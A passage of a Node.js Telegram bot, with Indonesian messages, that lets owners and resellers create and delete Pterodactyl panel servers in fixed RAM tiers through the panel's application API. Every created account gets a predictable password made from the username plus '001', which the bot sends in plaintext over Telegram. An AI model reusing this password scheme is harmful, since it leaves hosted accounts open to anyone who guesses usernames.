    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /2gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "2gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "2048";
  const cpu = "60";
  const disk = "2048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}_${u}@Danz.my.id`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendVideo(u, akunlo, {
        caption: `Hai @${u}
┏━⬣❏「 INFO DATA PANEL KAMU 」❏
┃• 好 Login : ${domain}
┃• 好 Username : ${user.username}
┃• 好 Password : ${password} 
┗━━━━━━━━━⬣
┏━⬣❏「 SPESIFIKASI PANEL 」❏
┃• 友 ID : ${user.id}
┃• 友 NAMA : ${username}
┃• 友 EMAIL : ${email}
┃• 友 RAM : 2gb
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣❏「 RULES HARUS DI PATUHI 」❏
┃• Wajib Di Pake
┃• Jangan Ddos Server
┃• Kalo jualan sensor domainnya
┃• Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣
`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//3Gb
bot.onText(/\/4gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_IMAGE;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /4gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "4gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "4048";
  const cpu = "110";
  const disk = "4048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendVideo(u, akunlo, {
        caption: `Hai @${u}
┏━⬣❏「 INFO DATA PANEL KAMU 」❏
┃• 好 Login : ${domain}
┃• 好 Username : ${user.username}
┃• 好 Password : ${password} 
┗━━━━━━━━━⬣
┏━⬣❏「 SPESIFIKASI PANEL 」❏
┃• 友 ID : ${user.id}
┃• 友 NAMA : ${username}
┃• 友 EMAIL : ${email}
┃• 友 RAM : 4gb
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣❏「 RULES HARUS DI PATUHI 」❏
┃• Wajib Di Pake
┃• Jangan Ddos Server
┃• Kalo jualan sensor domainnya
┃• Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣
`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 5gb
bot.onText(/\/5gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_IMAGE;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /5gb namapanel,idtele");
    return;
  }
  const username = t[0]; 
  const u = t[1];
  const name = username + "5gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "5048";
  const cpu = "140";
  const disk = "5048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendVideo(u, akunlo, {
        caption: `Hai @${u}
┏━⬣❏「 INFO DATA PANEL KAMU 」❏
┃• 好 Login : ${domain}
┃• 好 Username : ${user.username}
┃• 好 Password : ${password} 
┗━━━━━━━━━⬣
┏━⬣❏「 SPESIFIKASI PANEL 」❏
┃• 友 ID : ${user.id}
┃• 友 NAMA : ${username}
┃• 友 EMAIL : ${email}
┃• 友 RAM : 5gb
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣❏「 RULES HARUS DI PATUHI 」❏
┃• Wajib Di Pake
┃• Jangan Ddos Server
┃• Kalo jualan sensor domainnya
┃• Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣
`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/delsrv (.+)/, async (msg, match) => {
 const chatId = msg.chat.id;
 const senderId = msg.from.id;
 const srv = match[1].trim();

  if (!isOwner(senderId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  if (!srv) {
    bot.sendMessage(
      chatId,
      "Mohon masukkan ID server yang ingin dihapus, contoh: /delsrv 1234"
    );
    return;
  }

  try {
    let f = await fetch(domain + "/api/application/servers/" + srv, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });

    let res = f.ok ? { errors: null } : await f.json();

    if (res.errors) {
      bot.sendMessage(chatId, "SERVER TIDAK ADA");
    } else {
      bot.sendMessage(chatId, "SUCCESFULLY DELETE SERVER");
    }
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "Terjadi kesalahan saat menghapus server.");
  }
});

bot.onText(/\/6gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_IMAGE;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /6gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "6gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "6048";
  const cpu = "170";
  const disk = "6048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendVideo(u, akunlo, {
        caption: `Hai @${u}
┏━⬣❏「 INFO DATA PANEL KAMU 」❏
┃• 好 Login : ${domain}
┃• 好 Username : ${user.username}
┃• 好 Password : ${password} 
┗━━━━━━━━━⬣
┏━⬣❏「 SPESIFIKASI PANEL 」❏
┃• 友 ID : ${user.id}
┃• 友 NAMA : ${username}
┃• 友 EMAIL : ${email}
┃• 友 RAM : 6gb
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣❏「 RULES HARUS DI PATUHI 」❏
┃• Wajib Di Pake
┃• Jangan Ddos Server
┃• Kalo jualan sensor domainnya
┃• Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣
`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 7gb
bot.onText(/\/7gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_IMAGE;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /7gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "7gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "7048";
  const cpu = "200";
  const disk = "7048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendVideo(u, akunlo, {
        caption: `Hai @${u}
┏━⬣❏「 INFO DATA PANEL KAMU 」❏
┃• 好 Login : ${domain}
┃• 好 Username : ${user.username}
┃• 好 Password : ${password} 
┗━━━━━━━━━⬣
┏━⬣❏「 SPESIFIKASI PANEL 」❏
┃• 友 ID : ${user.id}
┃• 友 NAMA : ${username}
┃• 友 EMAIL : ${email}
┃• 友 RAM : 7gb
┗━━━━━━━━━━━━━━━━━━⬣
┗━━━━━━━━━⬣
┏━⬣❏「 RULES HARUS DI PATUHI 」❏
┃• Wajib Di Pake
┃• Jangan Ddos Server
┃• Kalo jualan sensor domainnya
┃• Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣
`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 8gb
bot.onText(/\/8gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_IMAGE;
  
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /8gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "8gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "8048";
  const cpu = "230";
  const disk = "8048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendVideo(u, akunlo, {
        caption: `Hai @${u}
┏━⬣❏「 INFO DATA PANEL KAMU 」❏
┃• 好 Login : ${domain}
┃• 好 Username : ${user.username}
┃• 好 Password : ${password} 
┗━━━━━━━━━⬣
┏━⬣❏「 SPESIFIKASI PANEL 」❏
┃• 友 ID : ${user.id}
┃• 友 NAMA : ${username}
┃• 友 EMAIL : ${email}
┃• 友 RAM : 8gb
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣❏「 RULES HARUS DI PATUHI 」❏
┃• Wajib Di Pake
┃• Jangan Ddos Server
┃• Kalo jualan sensor domainnya
┃• Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣
`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 9gb
bot.onText(/\/9gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_IMAGE;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /9gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "9gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "9048";
  const cpu = "260";
  const disk = "9048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
